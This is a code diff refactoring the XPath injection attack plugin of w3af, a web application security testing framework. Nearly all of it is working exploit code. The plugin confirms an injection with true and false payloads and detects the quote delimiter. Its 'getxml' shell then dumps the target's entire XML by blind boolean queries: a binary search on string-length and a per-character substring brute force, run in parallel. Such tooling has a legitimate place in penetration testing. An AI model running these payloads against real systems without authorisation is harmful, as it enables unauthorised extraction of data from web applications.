@@ -3,7 +3,7 @@ xpath.py
 
 Copyright 2012 Andres Riancho
 
-This file is part of w3af, w3af.sourceforge.net .
+This file is part of w3af, http://w3af.org/ .
 
 w3af is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -19,273 +19,213 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
+import difflib
+import re
+import textwrap
 
 from random import randint
-import re
-import difflib
 
-from core.data.kb.knowledgeBase import kb
-from core.data.parsers.urlParser import url_object
+import core.controllers.output_manager as om
 
-from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
-from core.controllers.w3afException import w3afException
-import core.controllers.outputManager as om
-from core.data.kb.exec_shell import shell as shell
+from core.controllers.plugins.attack_plugin import AttackPlugin
+from core.controllers.threads.threadpool import return_args
+from core.controllers.exceptions import w3afException
+from core.data.kb.shell import Shell
 
 ERROR_MSG = 'Empty Path Expression'
 XML_FILTER = '//*'
 THRESHOLD = 0.8
 
 
-class xpath(baseAttackPlugin):
+class xpath(AttackPlugin):
+    '''
+    Exploit XPATH injections with the objective of retrieving the complete XML text.
 
+    :author: Nahuel Sanchez
+    :author: Andres Riancho
+    '''
     def __init__(self):
-        baseAttackPlugin.__init__(self)
-        
-        # User configured parameter
-        self._change_to_post = True
-        self._url = ''
-        self._data = ''
-        self._inj_var = ''
-        self._method = 'GET'
-    
-        # Internal variables
-        self.use_difflib = None        
-        self.rnum = randint(1,100)
+        AttackPlugin.__init__(self)
 
-    def fastExploit( self ):
+        # Internal variables
+        self.rnum = randint(1, 100)
+
+    def get_attack_type(self):
         '''
-        Exploits a web app with osCommanding vuln, the settings are configured using setOptions()
+        :return: The type of exploit, SHELL, PROXY, etc.
         '''
-        raise w3afException('Not implemented.')
-    
-    def getOptions(self):
-        #TODO: Implement this
-        return []
-    
-    def setOptions(self, options):
-        #TODO: Implement this
-        pass
-    
-    def getAttackType(self):
-        '''
-        @return: The type of exploit, SHELL, PROXY, etc.
-        '''        
         return 'shell'
 
-    def getRootProbability(self):
-        return 0.0
-    
-    def getVulnName2Exploit( self ):
+    def get_root_probability(self):
         '''
-        This method should return the vulnerability name (as saved in the kb) to exploit.
-        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
-        
-        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
-        
-        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
-        return 'osCommanding' in this method.
-        '''        
-        return 'xpath'
-                
-    def _generateShell(self, vuln):
+        :return: This method returns the probability of getting a root shell
+                 using this attack plugin. This is used by the "exploit *"
+                 function to order the plugins and first try to exploit the
+                 more critical ones. This method should return 0 for an exploit
+                 that will never return a root shell, and 1 for an exploit that
+                 WILL ALWAYS return a root shell.
         '''
-        @param vuln: The vulnerability to exploit
+        return 0.1
+
+    def get_kb_location(self):
+        '''
+        This method should return the vulnerability names (as saved in the kb)
+        to exploit. For example, if the audit.os_commanding plugin finds a
+        vuln, and saves it as:
+
+        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
+
+        Then the exploit plugin that exploits os_commanding
+        (attack.os_commanding) should return ['os_commanding',] in this method.
         
-        @return: A shell object that allows the user to dump
+        If there is more than one location the implementation should return
+        ['a', 'b', ..., 'n']
+        '''
+        return ['xpath',]
+
+    def _generate_shell(self, vuln):
+        '''
+        :param vuln: The vulnerability to exploit
+
+        :return: A shell object that allows the user to dump
         the full XML using an xpath injection vulnerability.
-        '''        
+        '''
         #
         #    Check if the vulnerability can be exploited using our techniques
         #
-        if self._verifyVuln( vuln ):
-            #
-            #    Generate the shell
-            #
-            if vuln.getMethod() != 'POST' and self._change_to_post and \
-            self._verifyVuln( self.GET2POST( vuln ) ):
-                msg = 'The vulnerability was found using method GET, but POST is being used'
-                msg += ' during this exploit.'
-                om.out.console( msg )
-                vuln = self.GET2POST( vuln )
-            else:
-                msg = 'The vulnerability was found using method GET, tried to change the method to'
-                msg += ' POST for exploiting but failed.'
-                om.out.console( msg )
-            
+        vuln_verified, is_error_resp = self._verify_vuln(vuln)
+        if vuln_verified:
             # Create the shell object
-            shell_obj = xpath_reader( vuln )
-            shell_obj.setUrlOpener( self._uri_opener )
-            shell_obj.STR_DEL = self.STR_DEL
-            shell_obj.TRUE_COND = self.TRUE_COND
-            shell_obj.FALSE_COND = self.FALSE_COND
-            shell_obj.use_difflib = self.use_difflib  
+            shell_obj = XPathReader(vuln, self._uri_opener, self.worker_pool,
+                                    self.STR_DELIM, self.TRUE_COND,
+                                    is_error_resp)
             return shell_obj
-            
+
         else:
             # FAIL!
             return None
-            
-    def _verifyVuln(self, vuln):
+
+    def _verify_vuln(self, vuln):
         '''
-        @return: True if the vulnerability can be exploited.
+        :return: True if the vulnerability can be exploited.
         '''
-        #    Check if I should difflib or not during this exploit
-        self.use_difflib = self._verifyDifflib(vuln, 10)
-        
+        #    Check if I should difflib or not for this vulnerability
+        is_error_resp = self._configure_is_error_function(vuln, 5)
+
         #
         #    Create the TRUE and FALSE conditions for the queries using
         #    the correct string delimiter
         #
-        delimiter = self._get_delimiter( vuln )
-        if delimiter is None:
-            return False
+        delimiter = self._get_delimiter(vuln, is_error_resp)
+        self.STR_DELIM = delimiter
         
-        self.STR_DEL = delimiter
-        orig_value = vuln.getMutant().getOriginalValue()
-        
-        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
-                                                   self.rnum, self.STR_DEL, 
-                                                   self.STR_DEL, self.rnum)
-        
-        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
-                                                    self.rnum, self.STR_DEL, 
-                                                    self.STR_DEL, self.rnum + 1)
-        
-        exploit_dc = vuln.getDc()
-        functionReference = getattr( self._uri_opener , vuln.getMethod() )
-        exploit_dc[ vuln.getVar() ] = self.FALSE_COND
+        orig_value = vuln.get_mutant().get_original_value()
 
-        #
-        #    Testing False response
-        #
-        om.out.debug( "Testing FALSE response..." )
+        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM, self.STR_DELIM,
+                                                   self.rnum, self.STR_DELIM,
+                                                   self.STR_DELIM, self.rnum)
+
+        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM, self.STR_DELIM,
+                                                    self.rnum, self.STR_DELIM,
+                                                    self.STR_DELIM, self.rnum + 1)
+
+        exploit_dc = vuln.get_dc()
+        function_ptr = getattr(self._uri_opener, vuln.get_method())
+        
+        exploit_dc_false = exploit_dc.copy()
+        exploit_dc_false[vuln.get_var()] = self.FALSE_COND
+        
+        exploit_dc_true = exploit_dc.copy()
+        exploit_dc_true[vuln.get_var()] = self.TRUE_COND
+
         try:
-            false_resp = functionReference( vuln.getURL(), str(exploit_dc) )
+            false_resp = function_ptr(vuln.get_url(), str(exploit_dc_false))
+            true_resp = function_ptr(vuln.get_url(), str(exploit_dc_true))
         except w3afException, e:
-            return 'Error "' + str(e) + '"'
+            return 'Error "%s".' % e
         else:
-            if not response_is_error(vuln, false_resp.getBody(), self._uri_opener, self.use_difflib):  
-                om.out.debug( "ERROR: Error message not found in FALSE response..." )
-                return False
-            else:
-                om.out.debug( "Error message found in FALSE response GOOD!" )
-            #
-            #    Now that we know that the FALSE response was correct, test the
-            #    TRUE response.
-            #
-            om.out.debug( "Testing TRUE response..." )
-            exploit_dc[ vuln.getVar() ] = self.TRUE_COND
+            if is_error_resp(false_resp.get_body()) and\
+            not is_error_resp(true_resp.get_body()):
+                return True, is_error_resp
+        
+        return False, None
 
-            try:
-                true_resp = functionReference( vuln.getURL(), str(exploit_dc) )
-            except w3afException, e:
-                om.out.debug( 'Error "%s"' % (e) )
-                return None
-            else:              
-                if response_is_error(vuln, true_resp.getBody(), self._uri_opener, self.use_difflib):
-                    print true_resp.getBody()
-                    om.out.debug( "ERROR: Error message found in TRUE response..." )
-                    return False
-                else:
-                    om.out.debug( "Error message not found in TRUE response GOOD!" )
-                    return True
-            
-    def _get_delimiter(self, vuln):
+    def _get_delimiter(self, vuln, is_error_resp):
         '''
-        @return: The delimiter to be used to terminate strings, one of
+        :return: The delimiter to be used to terminate strings, one of
         single quote or double quote. If an error is found, None is returned.
         '''
-        exploit_dc = vuln.getDc()
-        orig_value = vuln.getMutant().getOriginalValue()
-        functionReference = getattr( self._uri_opener , vuln.getMethod() )
-        
+        exploit_dc = vuln.get_dc()
+        orig_value = vuln.get_mutant().get_original_value()
+        function_ptr = getattr(self._uri_opener, vuln.get_method())
+
         true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
-        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1) 
-        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum) 
+        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1)
+        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum)
+        false_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum + 1)
         
-        om.out.debug( "Trying to determine string delimiter" )
-        om.out.debug( "Testing single quote... (')" )
-        exploit_dc[ vuln.getVar() ] = true_sq
-        try:
-            sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
-        except w3afException, e:
-            om.out.debug( 'Error "%s"' % (e) )
-            return None
-        else:
-            if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
-                # If we found ERROR with TRUE Query, we have a problem!
-                om.out.debug( 'Single quote TRUE test failed, testing double quote' )
-                exploit_dc[ vuln.getVar() ] = true_dq
-                try:
-                    dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
-                except w3afException, e:
-                    om.out.debug( 'Error "%s"' % (e) )
-                    return None
-                else:
-                    if response_is_error(vuln, dq_resp.getBody(), self._uri_opener, self.use_difflib):
-                        # If we found an error HERE, the TWO tests were ERROR, 
-                        # Houston we have a BIG PROBLEM! 
-                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
-                        return None
-                    else:
-                        om.out.debug( 'String delimiter found! It is (")!' )
-                        return '"'
+        to_test = [("'", true_sq, false_sq),
+                   ('"', true_dq, false_dq)]
+        
+        for str_delim, true_xpath, false_xpath in to_test:
+            exploit_dc_true = exploit_dc.copy()
+            exploit_dc_false = exploit_dc.copy()
+            
+            exploit_dc_true[vuln.get_var()] = true_xpath
+            exploit_dc_false[vuln.get_var()] = false_xpath
+            
+            try:
+                true_resp = function_ptr(vuln.get_url(), str(exploit_dc_true))
+                false_resp = function_ptr(vuln.get_url(), str(exploit_dc_false))
+            except w3afException, e:
+                om.out.debug('Error "%s"' % (e))
             else:
-                # If true query was single-quote, test false query.
-                exploit_dc[ vuln.getVar() ] = false_sq
-                try:
-                    sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
-                except w3afException, e:
-                    om.out.debug( 'Error "%s"' % (e) )
-                    return None
-                else:
-                    if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
-                        om.out.debug( 'String delimiter FOUND, it is (\')!' )
-                        return "'"
-                    else:
-                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
-                        return None         
-                     
+                if is_error_resp(false_resp.get_body()) and\
+                not is_error_resp(true_resp.get_body()):
+                    return str_delim
+        else:
+            msg = 'Failed to identify XPATH injection string delimiter.'
+            raise w3afException(msg)                
 
-
-    def _verifyDifflib(self, vuln, count):
+    def _configure_is_error_function(self, vuln, count):
         '''
         This function determines if we can use DiffLib to evaluate responses
         If not possible Error base detection will be used.
-        
-        @return: TRUE if we can use DiffLib and FALSE if not.
-        '''
-        diffRatio = 0.0
-        
-        exploit_dc = vuln.getDc()
-        functionReference = getattr( self._uri_opener , vuln.getMethod() )
-        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
 
-        om.out.debug( "Testing if body dynamically changes... " )
+        :return: The function that should be used to compare responses. This
+                 function will return True when the response body passed as
+                 parameter contains an XPATH error.
+        '''
+        diff_ratio = 0.0
+
+        exploit_dc = vuln.get_dc()
+        function_ptr = getattr(self._uri_opener, vuln.get_method())
+        exploit_dc[vuln.get_var()] = vuln.get_mutant().get_original_value()
+
+        om.out.debug("Testing if body dynamically changes.")
         try:
-            base_res = functionReference( vuln.getURL(), str(exploit_dc) )
-            
-            for _ in xrange(count):
-                req_x = functionReference( vuln.getURL(), str(exploit_dc) )
-                diffRatio += difflib.SequenceMatcher(None, base_res.getBody(), 
-                                                    req_x.getBody()).ratio()
-                                                                         
-        except w3afException, e:
-            om.out.debug( 'Error "%s"' % (e) )
-        else:
-            om.out.debug( 'Test finished!' )
-            
-            if (diffRatio / count) > THRESHOLD:
-                om.out.debug( 'It is possible use difflib for identifying the error response' )
-                return True
-            else:
-                om.out.debug( 'Randomness is too high to use difflib, switching to error based detection...' )
-                return False
+            base_res = function_ptr(vuln.get_url(), str(exploit_dc))
 
-    def getLongDesc( self ):
+            for _ in xrange(count):
+                req_x = function_ptr(vuln.get_url(), str(exploit_dc))
+                diff_ratio += difflib.SequenceMatcher(None, base_res.get_body(),
+                                                     req_x.get_body()).ratio()
+
+        except w3afException, e:
+            om.out.debug('Error "%s"' % (e))
+        else:
+            use_difflib = (diff_ratio / count) < THRESHOLD
+            # FIXME: I'm not using difflib since it doesn't work well in my
+            #        test environment, but in the future I might need it for
+            #        a real engagement.
+            use_difflib = False
+            ier = IsErrorResponse(vuln, self._uri_opener, use_difflib)
+            is_error_resp = ier.is_error_response
+            return is_error_resp
+
+    def get_long_desc(self):
         '''
-        @return: A DETAILED description of the plugin functions and features.
+        :return: A DETAILED description of the plugin functions and features.
         '''
         return '''
         This plugin exploits XPATH injections. The exploit result is the full
@@ -293,205 +233,248 @@ class xpath(baseAttackPlugin):
 
         No options are available at this moment since the plugin is in beta phase.
         '''
-    
-class xpath_reader(shell):
 
-    def __init__(self, v):
-        shell.__init__(self, v)
+
+class XPathReader(Shell):
+
+    def __init__(self, vuln, uri_opener, worker_pool, str_delim,
+                 true_xpath, is_error_resp):
+        super(XPathReader, self).__init__(vuln, uri_opener, worker_pool)
         
+        self.STR_DELIM = str_delim
+        self.TRUE_COND = true_xpath
+        self.is_error_resp = is_error_resp
+         
         self._rOS = 'XML'
         self._rSystem = 'XPATH Query'
         self._rUser = None
         self._rSystemName = None
-        self.id = 0
-        
+
         # TODO: Review this HARD-CODED constant
         self.max_data_len = 10000
-    
+
     def __repr__(self):
-        return '<'+self.getName()+' object)>'
-    
+        return '<' + self.get_name() + ' object)>'
+
     __str__ = __repr__
 
-    def help( self, command ):
+    def help(self, command):
         '''
         Handle the help command.
         '''
-        result = []
-        result.append('Available commands:')
-        result.append('    help                            Display this information')
-        result.append('    getxml                          Get the full XML file')        
-        result.append('    exit                            Exit the shell session')
-        result.append('')
-        return '\n'.join(result)
- 
-    def specific_user_input( self, command ):
+        _help = '''\
+        Available commands:
+            help                            Display this information
+            getxml                          Get the full XML file
+            exit                            Exit this shell session
+        '''
+        return textwrap.dedent(_help)
+
+    def specific_user_input(self, command, parameters):
         '''
         This method is called when a user writes a command in the shell and hits enter.
-        
+
         Before calling this method, the framework calls the generic_user_input method
         from the shell class.
 
-        @parameter command: The command to handle ( ie. "read", "exec", etc ).
-        @return: The result of the command.
+        :param command: The command to handle ( ie. "read", "exec", etc ).
+        :param parameters: The parameters for @command.
+        :return: The result of the command.
         '''
-        # Get the command and the parameters
-        splist = command.split(' ')
-        command = splist[0]
-        
         if command.strip() == 'getxml':
             return self.getxml()
-        
+
     def getxml(self):
         '''
         This method executes a command in the remote operating system by
         exploiting the vulnerability.
 
-        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
-        @return: The result of the command.
+        :param command: The command to handle ( ie. "ls", "whoami", etc ).
+        :return: The result of the command.
         '''
-        data_len = self._get_data_len()
-        if data_len is not None:
-            
-            try:
-                data = self.get_data(data_len)
-            except w3afException:
-                om.out.debug( 'Error found during data extraction: "%s"' % w3afException )
-                return ''
-            else:
-                return data
+        try:
+            data_len = self._get_data_len()
+        except w3afException, e:
+            return 'Error found during data length extraction: "%s"' % e
+        else:
+            if data_len is not None:
+                try:
+                    data = self.get_data(data_len)
+                except w3afException, e:
+                    return 'Error found during data extraction: "%s"' % e
+                else:
+                    return data
 
     def _get_data_len(self):
         '''
-        @return: The length of the data to retrieve or self.max_data_len if the
+        :return: The length of the data to retrieve or self.max_data_len if the
         XML is too long. In the case of an error, None is returned.
         '''
-        exploit_dc = self.getDc()
-        functionReference = getattr( self._uri_opener , self.getMethod() )
-
+        om.out.debug("Finding XML data length (max: %s)" % self.max_data_len)
+        
         maxl = self.max_data_len
         minl = 1
         
-        om.out.debug("Finding XML data length...")
-        
-        fdata_len = False
-        while not fdata_len:
-            
+        while True:
+
             mid = (maxl + minl) / 2
-            om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
-
-            orig_value = self.getMutant().getMutant().getOriginalValue()
-            skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
-
-            findlen = "%s%s and string-length(%s)=%i %s" % (orig_value,
-                                                           self.STR_DEL,
-                                                           XML_FILTER, 
-                                                           mid, self.TRUE_COND[skip_len:])
-            exploit_dc[ self.getVar() ] = findlen
+            om.out.debug("MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl))
             
-            try:    
-                lresp = functionReference( self.getURL(), str(exploit_dc) )
-            except w3afException, e:
-                om.out.debug( 'Error "%s"' % (e) )
+            if self._verify_data_len_eq(mid):
+                om.out.debug('Response Length FOUND!: %i ' % (mid))
+                return mid
+            
             else:
-                if response_is_error(self, lresp.getBody(), self._uri_opener, self.use_difflib):
-                    # We found the length!
-                    fdata_len = True
-                    om.out.debug('Response Length FOUND!: %i ' % (mid) )
-                    return mid
-                
+                if self._verify_data_len_lt(mid):
+                    maxl = mid
                 else:
-
-                    findlen = "%s%s and string-length(%s)<%i %s" % (orig_value,
-                                                                   self.STR_DEL,
-                                                                   XML_FILTER, 
-                                                                   mid , self.TRUE_COND[skip_len:])
-                    try:
-                        exploit_dc[ self.getVar() ] = findlen
-                        lresp = functionReference( self.getURL(), str(exploit_dc) )
-                    except w3afException, e:
-                        om.out.debug( 'Error "' + str(e) + '"')
-                        return None
-                    else:
-                        if not response_is_error(self, lresp.getBody(), 
-                                                 self._uri_opener,
-                                                 self.use_difflib):
-                            # LENGTH IS < THAN MID
-                            maxl = mid
-                        else:
-                            # LENGTH IS > THAN MID
-                            minl = mid
-
-    def get_data(self, ldata):
-        '''
-        @param ldata: The data length to retrieve
-        @return: A string with the XML data!
-        
-        HTTP library exceptions are not handled in order to make the code clearer. 
-        '''
-        exploit_dc = self.getDc()
-        functionReference = getattr( self._uri_opener , self.getMethod() )
-
-        data = ''
-        
-        for pos in range(ldata):
-            for c in range(32,127):
-
-                orig_value = self.getMutant().getMutant().getOriginalValue()
-                skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
-                
-                hexcar = chr(c)
-                dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (orig_value,
-                                                                 self.STR_DEL,
-                                                                 XML_FILTER, 
-                                                                 pos, hexcar, 
-                                                                 self.TRUE_COND[skip_len:])
-                exploit_dc[ self.getVar() ] = dataq
-                dresp = functionReference( self.getURL(), str(exploit_dc) )
-                
-                if not response_is_error(self, dresp.getBody(), self._uri_opener, self.use_difflib):
-                    om.out.console('Character found: "%s"' % hexcar )
-                    data += hexcar
-                    break
-            else:
-                om.out.console('Character NOT found!')
-                    
-        return data
-            
-    def end( self ):
-        om.out.debug('xpath_reader cleanup complete.')
-        
-    def getName( self ):
-        return 'xpath_reader'
-        
-
-#
-#    Helper functions
-#
-def response_is_error(vuln_obj, res_body, url_opener, use_difflib=True):
-    '''
-    This functions checks which method must be used to check Responses
+                    minl = mid
     
-    @return: True if the res_body is ERROR and FALSE if Not
-    '''
-    if use_difflib:
+    def _fill_xpath_and_eval(self, xpath_fmt, str_len):
+        '''
+        Given a xpath_fmt which takes five params:
+            - Original value
+            - String delimiter
+            - XML filter
+            - XML filter result length to compare agains (@str_len)
+            - True condition
         
-        exploit_dc = vuln_obj.getDc()
-        functionReference = getattr( url_opener , vuln_obj.getMethod() )
-
-        exploit_dc[ vuln_obj.getVar() ] = vuln_obj.getMutant().getOriginalValue()
-
-        # TODO: Perform this request only once
-        base_res = functionReference( vuln_obj.getURL(), str(exploit_dc) )
-        if difflib.SequenceMatcher(None, base_res.getBody(), 
-                                   res_body).ratio() < THRESHOLD :
-            return True
-        else:
-            return False
-
-    else:
+        Generate the XPATH, send it to the remote server and
+        :return: True when the response does NOT contain an XPATH error.
+        '''
+        exploit_dc = self.get_dc()
+        function_ptr = getattr(self._uri_opener, self.get_method())
+        orig_value = self.get_mutant().get_original_value()
+        skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
         
-        if re.search(ERROR_MSG, res_body, re.IGNORECASE):
+        findlen = xpath_fmt % (orig_value, self.STR_DELIM, XML_FILTER,
+                               str_len, self.TRUE_COND[skip_len:])
+        
+        exploit_dc[self.get_var()] = findlen
+        lresp = function_ptr(self.get_url(), str(exploit_dc))
+        if not self.is_error_resp(lresp.get_body()): 
             return True
+        
+        return False   
+        
+    def _verify_data_len_lt(self, str_len):
+        '''
+        :return: True if the string data length is LESS THAN @str_len 
+        '''
+        xpath_fmt = "%s%s and string-length(%s)<%i %s"
+        return self._fill_xpath_and_eval(xpath_fmt, str_len)
+    
+    def _verify_data_len_eq(self, str_len):
+        '''
+        :return: True if the string data length is @str_len 
+        '''
+        xpath_fmt = "%s%s and string-length(%s)=%i %s"
+        return self._fill_xpath_and_eval(xpath_fmt, str_len)
+        
+    def get_data(self, data_len):
+        '''
+        :param data_len: The data length to retrieve
+        :return: A string with the XML data!
+
+        HTTP library exceptions are not handled in order to make the code
+        clearer.
+        '''
+        data = [None] * data_len
+        
+        mod_get_char = return_args(self.get_char_in_pos)
+        imap_unordered = self.worker_pool.imap_unordered
+        len_iter = xrange(data_len)
+        
+        for (pos,), char in imap_unordered(mod_get_char, len_iter):
+            data[pos] = char
+        
+        clean_data = []
+        current = ''
+        
+        for char in data:
+            if char is None:
+                current = current.strip()
+                if current != '':
+                    clean_data.append(current)
+                current = ''
+            else:
+                current += char
+        
+        return '\n'.join(clean_data)
+    
+    def get_char_in_pos(self, pos):
+        '''
+        :return: The character for position @pos in the XML.
+        '''
+        exploit_dc = self.get_dc()
+        function_ptr = getattr(self._uri_opener, self.get_method())
+        
+        for c in range(32, 127):
+
+            orig_value = self.get_mutant().get_original_value()
+            skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
+
+            hexcar = chr(c)
+            dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (orig_value,
+                                                             self.STR_DELIM,
+                                                             XML_FILTER,
+                                                             pos, hexcar,
+                                                             self.TRUE_COND[skip_len:])
+            exploit_dc[self.get_var()] = dataq
+            dresp = function_ptr(self.get_url(), str(exploit_dc))
+
+            if not self.is_error_resp(dresp.get_body()):
+                om.out.console('Character found: "%s"' % hexcar)
+                return hexcar
         else:
-            return False
+            om.out.console('Character NOT found!')
+            return None
+
+    def get_name(self):
+        return 'xpath_reader'
+
+    def identify_os(self):
+        self._rOS = 'unknown'
+        self._rSystem = 'XPath'
+        self._rUser = 'xml-file'
+        self._rSystemName = 'unknown'
+        
+class IsErrorResponse(object):
+    def __init__(self, vuln_obj, url_opener, use_difflib):
+        self.vuln_obj = vuln_obj
+        self.url_opener = url_opener
+        self.use_difflib = use_difflib
+        self.base_response = None
+
+    def _configure(self):
+        exploit_dc = self.vuln_obj.get_dc()
+        function_ptr = getattr(self.url_opener, self.vuln_obj.get_method())
+
+        exploit_dc[self.vuln_obj.get_var()] = self.vuln_obj.get_mutant().get_original_value()
+        
+        self.base_response = function_ptr(self.vuln_obj.get_url(), str(exploit_dc))
+        
+    def is_error_response(self, res_body):
+        '''
+        This functions checks which method must be used to check Responses
+    
+        :return: True if the res_body is ERROR and FALSE if Not
+        '''
+        # FIXME: See FIXME above where I disable the use of difflib.
+        if self.use_difflib:
+            
+            if self.base_response is None:
+                self._configure()
+                
+            if difflib.SequenceMatcher(None, self.base_response.get_body(),
+                                       res_body).ratio() > THRESHOLD:
+                return True
+            else:
+                return False
+    
+        else:
+    
+            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
+                return True
+            else:
+                return False
